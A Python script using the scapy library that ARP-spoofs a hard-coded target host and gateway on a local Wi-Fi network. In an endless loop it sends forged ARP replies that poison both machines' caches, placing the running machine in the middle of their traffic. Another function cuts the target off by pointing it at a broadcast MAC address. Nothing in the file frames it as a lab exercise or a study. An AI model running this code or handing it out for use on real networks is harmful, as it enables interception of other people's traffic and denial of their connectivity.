import urllib3
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import sniff, srp, sendp

target_ip = "192.168.1.41"
gateway_ip = "192.168.1.247"
interface = "Wi-Fi"
stop_sniffing = [False]
stop_spoofing = [False]

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def arp_spoof(target_ip, spoof_ip, interface='Wi-Fi'):
    target_mac = get_mac(target_ip)
    packet = Ether() / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=interface, verbose=False)


def arp_block(target_ip, gateway_ip, interface='Wi-Fi'):
    fake_mac = "ff:ff:ff:ff:ff:ff"  # This is a fake MAC address
    packet = Ether() / ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=fake_mac)
    sendp(packet, iface=interface, verbose=False)

def get_mac(ip):
    response, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=2, retry=10, verbose=False)
    for _, packet in response:
        return packet[Ether].src

while True:
    arp_spoof(target_ip, gateway_ip, interface)
    arp_spoof(gateway_ip, target_ip, interface)